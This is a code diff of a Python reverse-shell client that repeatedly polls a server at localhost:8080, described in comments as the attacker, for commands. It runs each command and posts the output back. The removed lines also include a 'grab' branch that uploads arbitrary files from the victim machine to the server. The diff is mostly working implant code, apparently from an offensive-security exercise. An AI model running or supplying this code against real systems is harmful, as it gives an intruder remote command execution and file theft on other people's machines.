@@ -1,38 +1,35 @@
-# Client
-
-import requests  # Library to be installed and imported
+import http.client
 import subprocess
 import time
-import os
+
 
 while True:
 
-    # Send GET request to host machine
-    req = requests.get('http://localhost:8080')
-    # Store the received txt into command variable
-    command = req.text
+    # Setup connection to attacker
+    conn = http.client.HTTPConnection('localhost', 8080)
 
-    if 'terminate' in command:
+    # Send get request and get response
+    conn.request("GET", "/")
+    r = conn.getresponse()
+    command = r.read().decode()
+
+    if command in {'terminate', 't'}:
+        print("Terminating Connection")
         break
 
-    elif 'grab' in command:
-        grab, path = command.split('*')
-
-        if os.path.exists(path):
-            url = 'http://localhost:8080/store'  # Append /store in the URL
-            # Add a dictionary key where file will be stored
-            files = {'file': open(path, 'rb')}
-            r = requests.post(url, files=files)  # Send the file
-            # requests library use POST method called "multipart/form-data"
-        else:
-            post_response = requests.post(
-                url='http://localhost:8080', data='[-] Not able to find the file !')
     else:
         print(f"Additional command running {command}")
-        CMD = subprocess.Popen(command, stdin=subprocess.PIPE,
-                               stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
-        post_response = requests.post(
-            url='http://localhost:8080', data=CMD.stdout.read())
-        post_response = requests.post(
-            url='http://localhost:8080', data=CMD.stderr.read())
-    time.sleep(3)
+
+        # open subprocess and pipe stdout and stderr to it
+        CMD = subprocess.run(command, capture_output=True)
+
+        # if stdout or stderr exists send back to attacker
+        out = CMD.stdout.decode()
+        if out:
+            conn.request("POST", "", out)
+            conn.getresponse()
+        err = CMD.stderr.decode()
+        if err:
+            conn.request("POST", "", err)
+            conn.getresponse()
+    time.sleep(1)
